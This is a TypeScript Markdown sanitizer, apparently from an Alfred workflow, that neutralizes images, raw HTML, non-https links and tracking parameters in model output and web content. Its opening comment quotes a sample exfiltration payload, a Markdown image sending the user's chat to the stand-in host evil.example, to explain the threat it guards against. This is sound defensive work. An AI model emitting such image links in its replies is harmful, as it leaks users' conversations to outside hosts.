// Model output and web content are untrusted. Alfred's Text View renders Markdown, so a reply such as
// `![](https://evil.example/?q=<your chat>)` would make the view fetch that address and leak the chat.
// Everything shown or copied therefore goes through sanitizeMarkdown: images are never rendered (their address is
// shown as text instead, except the workflow's own pictures), raw HTML is turned into text, and only https links remain.

const MAX_URL = 2000;
const MAX_SHOWN_URL = 500;
const MAX_DEPTH = 4;
const SLOT_OPEN = "\uE000";
const SLOT_CLOSE = "\uE001";

const TRACKING_PARAM = /^(utm_[a-z0-9_]*|fbclid|gclid|dclid|gbraid|wbraid|msclkid|yclid|twclid|igshid|mc_cid|mc_eid|_hsenc|_hsmi|mkt_tok|vero_id|ref_src|ref_url|s_cid|oly_enc_id|oly_anon_id|spm|ck_subscriber_id)$/i;

export type SanitizeOptions = {
  // Absolute folders whose pictures may be shown, such as the folder generated images are saved in.
  imageRoots?: string[];
};

// An https address without credentials or tracking parameters, ready to put in a link; null for anything else.
export function safeUrl(raw: string): string | null {
  const url = raw.trim();
  if (url === "" || url.length > MAX_URL) return null;
  if (/[\s\u0000-\u001f\u007f-\u009f<>"`\\]/.test(url)) return null;
  const match = /^https:\/\/([^/?#]*)([^?#]*)(\?[^#]*)?(#.*)?$/i.exec(url);
  if (!match) return null;
  const authority = match[1]!;
  if (!/^[a-z0-9]([a-z0-9.-]*[a-z0-9])?\.(?:[a-z]{2,}|xn--[a-z0-9-]+)(:\d{1,5})?$/i.test(authority)) return null;
  const query = (match[3] ?? "")
    .slice(1)
    .split("&")
    .filter((pair) => pair !== "" && !TRACKING_PARAM.test(pair.split("=")[0]!))
    .join("&");
  return `https://${authority.toLowerCase()}${match[2]}${query === "" ? "" : `?${query}`}${match[4] ?? ""}`;
}

// The site of a url that safeUrl accepted, without port or a leading www.
export function hostOf(url: string): string {
  const match = /^https:\/\/([^/?#:]+)/i.exec(url);
  return match ? match[1]!.toLowerCase().replace(/^www\./, "") : "";
}

// Plain text that cannot start any Markdown construct: for titles and other text from outside.
export function escapeMarkdown(text: string, max = 200): string {
  const flat = text.replace(/[\u0000-\u001f\u007f-\u009f]+/g, " ").replace(/\s+/g, " ").trim();
  const cut = flat.length > max ? `${flat.slice(0, max)}…` : flat;
  return cut.replace(/[\\`*_{}[\]()<>!|~&#+]/g, "\\$&");
}

function encodeDest(url: string): string {
  return url.replace(/\(/g, "%28").replace(/\)/g, "%29").replace(/\[/g, "%5B").replace(/\]/g, "%5D");
}

// An address shown as text inside a code span that nothing in it can end.
function shownCode(dest: string): string {
  const flat = dest
    .replace(/[\u0000-\u001f\u007f-\u009f]+/g, " ")
    .trim()
    .replace(/%/g, "%25")
    .replace(/\s/g, "%20")
    .replace(/`/g, "%60")
    .replace(/\[/g, "%5B")
    .replace(/\]/g, "%5D")
    .replace(/</g, "%3C")
    .replace(/>/g, "%3E");
  if (flat === "") return "`(empty)`";
  return `\`${flat.length > MAX_SHOWN_URL ? `${flat.slice(0, MAX_SHOWN_URL)}…` : flat}\``;
}

const PUNCTUATION = /[!-/:-@[-`{-~]/;

function isBlankAfter(s: string, newline: number): boolean {
  let k = newline + 1;
  while (s[k] === " " || s[k] === "\t") k++;
  return s[k] === "\n";
}

// A code span stays on one line here, so this never sees code where a renderer would not.
function codeSpanEnd(s: string, start: number): number {
  let n = 0;
  while (s[start + n] === "`") n++;
  let j = start + n;
  while (j < s.length && s[j] !== "\n") {
    if (s[j] === "`") {
      let m = 0;
      while (s[j + m] === "`") m++;
      if (m === n) return j + m;
      j += m;
    } else {
      j++;
    }
  }
  return -1;
}

function matchClose(s: string, open: number, up: string, down: string): number {
  let depth = 0;
  for (let j = open; j < s.length; j++) {
    const c = s[j]!;
    if (c === "\\") {
      j++;
    } else if (c === "`") {
      const end = codeSpanEnd(s, j);
      if (end > 0) j = end - 1;
      else while (s[j + 1] === "`") j++;
    } else if (c === up) {
      depth++;
    } else if (c === down) {
      depth--;
      if (depth === 0) return j;
    } else if (c === "\n" && isBlankAfter(s, j)) {
      return -1;
    }
  }
  return -1;
}

type Definitions = Map<string, string>;

const normalizeLabel = (label: string) => label.replace(/\\(.)/g, "$1").trim().replace(/\s+/g, " ").toLowerCase();

type Context = { defs: Definitions; roots: string[]; slots: string[] };

function isLocalImage(dest: string, roots: string[]): boolean {
  if (/[\u0000-\u001f<>`"\\[\]?#]/.test(dest) || dest.indexOf("://") >= 0 || dest.split("/").indexOf("..") >= 0) return false;
  return roots.some((root) => root.startsWith("/") && dest.startsWith(`${root}/`) && dest.length > root.length + 1);
}

// "dest" or "dest "title"" from between a link's parentheses; the title is dropped.
function destinationOf(raw: string): string {
  const text = raw.trim();
  const angle = /^<([^<>\n]*)>/.exec(text);
  if (angle) return angle[1]!;
  const titled = /^(\S+)\s+(?:"[^"]*"|'[^']*'|\([^)]*\))$/.exec(text);
  return titled ? titled[1]! : text;
}

function bracketed(s: string, i: number, image: boolean, ctx: Context, depth: number): { out: string; end: number } | null {
  const open = image ? i + 1 : i;
  const close = matchClose(s, open, "[", "]");
  if (close < 0) return null;
  const label = s.slice(open + 1, close);
  let dest: string;
  let end: number;
  if (s[close + 1] === "(") {
    const paren = matchClose(s, close + 1, "(", ")");
    if (paren < 0) return null;
    dest = destinationOf(s.slice(close + 2, paren));
    end = paren + 1;
  } else {
    let key = label;
    end = close + 1;
    if (s[close + 1] === "[") {
      const second = matchClose(s, close + 1, "[", "]");
      if (second > 0) {
        const inner = s.slice(close + 2, second);
        key = inner.trim() === "" ? label : inner;
        end = second + 1;
      }
    }
    const found = ctx.defs.get(normalizeLabel(key));
    if (found === undefined) return null;
    dest = found;
  }
  if (image) {
    if (isLocalImage(dest, ctx.roots)) {
      ctx.slots.push(`![](${dest})`);
      return { out: `${SLOT_OPEN}${ctx.slots.length - 1}${SLOT_CLOSE}`, end };
    }
    // A backtick right after the shown address would merge with it and change how later code spans pair up.
    return { out: `🖼 image not loaded: ${shownCode(dest)}${s[end] === "`" ? " " : ""}`, end };
  }
  const shown = scan(label, ctx, depth + 1);
  const url = safeUrl(dest);
  if (url === null) return { out: `${shown} (${shownCode(dest)})`, end };
  const host = hostOf(url);
  const named = shown.toLowerCase().indexOf(host) >= 0 || s.startsWith(` (${host})`, end);
  return { out: `[${shown}](${encodeDest(url)})${named ? "" : ` (${host})`}`, end };
}

function scan(s: string, ctx: Context, depth: number): string {
  if (depth > MAX_DEPTH) return s.replace(/[\\![\]<`]/g, "\\$&");
  let out = "";
  let i = 0;
  while (i < s.length) {
    const c = s[i]!;
    if (c === "\\") {
      const next = s[i + 1];
      if (next !== undefined && PUNCTUATION.test(next)) {
        out += c + next;
        i += 2;
      } else {
        out += c;
        i++;
      }
    } else if (c === "`") {
      const end = codeSpanEnd(s, i);
      if (end > 0) {
        out += s.slice(i, end);
        i = end;
      } else {
        let n = 0;
        while (s[i + n] === "`") n++;
        out += s.slice(i, i + n);
        i += n;
      }
    } else if (c === "<") {
      const auto = /^<(https:\/\/[^\s<>`\\]+)>/i.exec(s.slice(i, i + MAX_URL + 10));
      const url = auto ? safeUrl(auto[1]!) : null;
      if (auto && url !== null) {
        out += `<${url}>`;
        i += auto[0].length;
      } else {
        out += s[i + 1] !== undefined && /[A-Za-z/!?]/.test(s[i + 1]!) ? "\\<" : "<";
        i++;
      }
    } else if (c === "!" && s[i + 1] === "[") {
      const found = bracketed(s, i, true, ctx, depth);
      if (found) {
        out += found.out;
        i = found.end;
      } else {
        out += "\\!";
        i++;
      }
    } else if (c === "[") {
      const found = bracketed(s, i, false, ctx, depth);
      if (found) {
        out += found.out;
        i = found.end;
      } else {
        out += c;
        i++;
      }
    } else {
      out += c;
      i++;
    }
  }
  return out;
}

// A fence run after four or more spaces, tabs, quote marks, or list markers.
const AMBIGUOUS_FENCE = /^[ \t>+*\-\d.)]+(`{3,}|~{3,})/;

function leadingColumns(line: string): number {
  let columns = 0;
  for (const c of line) {
    if (c === " ") columns++;
    else if (c === "\t") columns += 4 - (columns % 4);
    else break;
  }
  return columns;
}
const DEFINITION_START = /^((?:[ \t]|>|[-+*]|\d{1,9}[.)])*)\[((?:[^\]\\\n]|\\.)*)\]:/;
const DEFINITION_REST = /^[ \t]*(?:<([^<>\n]*)>|(\S+))[ \t]*(?:"[^"]*"|'[^']*'|\([^)]*\))?[ \t]*$/;

// Last line of defence, on the output of scan: whatever the transformations produced, no image start, no tag start
// (a replaced link can leave a "<" next to a label), and no link definition survives in text outside code.
function net(chunk: string): string {
  let out = "";
  let i = 0;
  while (i < chunk.length) {
    const c = chunk[i]!;
    if (c === "\\") {
      out += c + (chunk[i + 1] ?? "");
      i += 2;
    } else if (c === "`") {
      const end = codeSpanEnd(chunk, i);
      if (end > 0) {
        out += chunk.slice(i, end).replace(/(^|[^\\])!\[/g, "$1\\![");
        i = end;
      } else {
        let n = 0;
        while (chunk[i + n] === "`") n++;
        out += chunk.slice(i, i + n);
        i += n;
      }
    } else if (c === "<") {
      const auto = /^<(https:\/\/[^\s<>`\\]+)>/i.exec(chunk.slice(i, i + MAX_URL + 10));
      if (auto && safeUrl(auto[1]!) === auto[1]) {
        out += auto[0];
        i += auto[0].length;
      } else {
        out += chunk[i + 1] !== undefined && /[A-Za-z/!?]/.test(chunk[i + 1]!) ? "\\<" : "<";
        i++;
      }
    } else if (c === "!" && chunk[i + 1] === "[") {
      out += "\\!";
      i++;
    } else {
      out += c;
      i++;
    }
  }
  return out
    .split("\n")
    .map((line) => {
      const start = DEFINITION_START.exec(line);
      return start && !start[2]!.startsWith("^") ? `${start[1]}\\${line.slice(start[1]!.length)}` : line;
    })
    .join("\n");
}

// Replacing an inner image or link changes how brackets pair up, so the output can hold a link or an image that the
// input did not: run again until nothing changes. Text that never settles is escaped whole.
function settle(text: string, ctx: Context): string {
  let current = text;
  for (let pass = 0; pass < 4; pass++) {
    const next = net(scan(current, ctx, 0));
    if (next === current) return current;
    current = next;
  }
  return current.replace(/[\\![\]<`]/g, "\\$&");
}

type Fence = { char: string; size: number; indent: number };

// Where a viewer stands after this text. A viewer that puts a fence inside a list item also ends it at a less
// indented line, so the same text can leave one reading inside a fence and the other outside.
function fenceAfter(text: string, start: Fence | null, listAware: boolean): Fence | null {
  let fence = start;
  for (const line of text.split("\n")) {
    if (fence !== null) {
      const closing = /^ {0,3}(`{3,}|~{3,})[ \t]*$/.exec(line);
      if (closing && closing[1]![0] === fence.char && closing[1]!.length >= fence.size) {
        fence = null;
        continue;
      }
      if (!listAware || line.trim() === "" || leadingColumns(line) >= fence.indent) continue;
      fence = null;
    }
    const opening = /^( {0,3})(`{3,}|~{3,})(.*)$/.exec(line);
    if (opening && !(opening[2]![0] === "`" && opening[3]!.indexOf("`") >= 0)) fence = { char: opening[2]![0]!, size: opening[2]!.length, indent: opening[1]!.length };
  }
  return fence;
}

type Segment = { code: boolean; text: string };

type Mode = "normal" | "no code" | "no fences";

// Each mode trusts less than the one before it. The last always succeeds.
export function sanitizeMarkdown(input: string, options: SanitizeOptions = {}): string {
  for (const mode of ["normal", "no code", "no fences"] as Mode[]) {
    const result = sanitizeWith(input, options, mode);
    if (result !== null) return result;
  }
  throw new Error("unreachable");
}

// Null when the output's own fences do not line up with the code this reading trusted, or when the two ways a viewer
// reads an indented fence end in different states: a replaced link can create a fence opener, and then a "closing"
// fence is really an opener and its content is live. "no fences" also escapes every fence marker, so none exists.
function sanitizeWith(input: string, options: SanitizeOptions, mode: Mode): string | null {
  const trustNoCode = mode !== "normal";
  const lines = input.replace(/[\uE000\uE001]/g, "").replace(/\r\n?/g, "\n").split("\n");
  const ctx: Context = { defs: new Map(), roots: (options.imageRoots ?? []).map((root) => root.replace(/\/+$/, "")), slots: [] };
  const code: boolean[] = [];

  // Pass 1: which lines are fenced code, and the link definitions.
  // - A fence opening at the very start of a line is certain: no list or quote can contain it.
  // - One indented one to three spaces may be top level (it then runs to its closer) or inside a list item (it then
  //   also ends at a less indented line). Both agree on the lines up to a closer or such a line, so those are code; a
  //   less indented line before any closer leaves the two readings apart, and from there nothing is trusted as code.
  // - One inside a quote or after a list marker or tab is not trusted at all.
  let fence = null as { char: string; size: number } | null;
  let indented = null as { char: string; size: number; columns: number } | null;
  let strict = trustNoCode;
  for (let n = 0; n < lines.length; n++) {
    const line = lines[n]!;
    if (strict) {
      code.push(false);
    } else if (fence !== null) {
      code.push(true);
      const closing = /^ {0,3}(`{3,}|~{3,})[ \t]*$/.exec(line);
      if (closing && closing[1]![0] === fence.char && closing[1]!.length >= fence.size) fence = null;
      continue;
    } else if (indented !== null) {
      const closing = /^ {0,3}(`{3,}|~{3,})[ \t]*$/.exec(line);
      if (closing && closing[1]![0] === indented.char && closing[1]!.length >= indented.size) {
        indented = null;
        code.push(true);
        continue;
      }
      if (line.trim() === "" || leadingColumns(line) >= indented.columns) {
        code.push(true);
        continue;
      }
      indented = null;
      strict = true;
      code.push(false);
    } else {
      const shallow = /^( {1,3})(`{3,}|~{3,})(.*)$/.exec(line);
      const opening = /^(`{3,}|~{3,})(.*)$/.exec(line);
      if (shallow && !(shallow[2]![0] === "`" && shallow[3]!.indexOf("`") >= 0)) {
        indented = { char: shallow[2]![0]!, size: shallow[2]!.length, columns: shallow[1]!.length };
        code.push(true);
        continue;
      }
      if (opening && !(opening[1]![0] === "`" && opening[2]!.indexOf("`") >= 0)) {
        fence = { char: opening[1]![0]!, size: opening[1]!.length };
        code.push(true);
        continue;
      }
      if (AMBIGUOUS_FENCE.test(line)) strict = true;
      code.push(false);
    }
    const start = DEFINITION_START.exec(line);
    if (start && !start[2]!.startsWith("^")) {
      const rest = DEFINITION_REST.exec(line.slice(start[0].length));
      if (rest) {
        const key = normalizeLabel(start[2]!);
        if (!ctx.defs.has(key)) ctx.defs.set(key, rest[1] ?? rest[2] ?? "");
        lines[n] = start[1]!.replace(/[ \t]+$/, "");
      } else {
        lines[n] = `${start[1]}\\${line.slice(start[1]!.length)}`;
      }
    }
  }

  const segments: Segment[] = [];
  for (let n = 0; n < lines.length; n++) {
    const last = segments[segments.length - 1];
    if (last && last.code === code[n]) last.text += `\n${lines[n]}`;
    else segments.push({ code: code[n]!, text: lines[n]! });
  }

  if (mode === "no fences") return finish(segments.map((segment) => unfenced(segment.text, ctx)).join("\n"), ctx);
  const pieces = segments.map((segment) => (segment.code ? segment.text : settle(segment.text, ctx)));

  // Every trusted code block must start outside a fence, in either reading, in the output as a viewer reads it.
  let flat: Fence | null = null;
  let nested: Fence | null = null;
  for (let k = 0; k < segments.length; k++) {
    if (segments[k]!.code && (flat !== null || nested !== null)) return null;
    flat = fenceAfter(pieces[k]!, flat, false);
    nested = fenceAfter(pieces[k]!, nested, true);
  }
  let out = pieces.join("\n");
  // A fence left open would swallow whatever the view shows after this text. This reads the output, not the input,
  // because a replaced link can also leave a fence at the start of a line, and an indented fence counts for a viewer.
  if (flat !== null || nested !== null) {
    if (flat === null || nested === null || flat.char !== nested.char || flat.size !== nested.size) return null;
    out += `\n${flat.char.repeat(flat.size)}`;
    if (fenceAfter(out, null, false) !== null || fenceAfter(out, null, true) !== null) return null;
  }
  return finish(out, ctx);
}

const escapeFences = (text: string) => text.replace(/^( {0,3})(`{3,}|~{3,})/gm, "$1\\$2");

// Fence markers are escaped before the text is read, so the code spans it finds are the ones a viewer finds, and
// again after, in case a replacement made a new one.
function unfenced(text: string, ctx: Context): string {
  let current = text;
  for (let round = 0; round < 4; round++) {
    current = settle(escapeFences(current), ctx);
    if (escapeFences(current) === current) return current;
  }
  return escapeFences(current).replace(/[\\![\]<`]/g, "\\$&");
}

function finish(out: string, ctx: Context): string {
  return out.replace(new RegExp(`${SLOT_OPEN}(\\d+)${SLOT_CLOSE}`, "g"), (_all, index: string) => ctx.slots[Number(index)] ?? "");
}
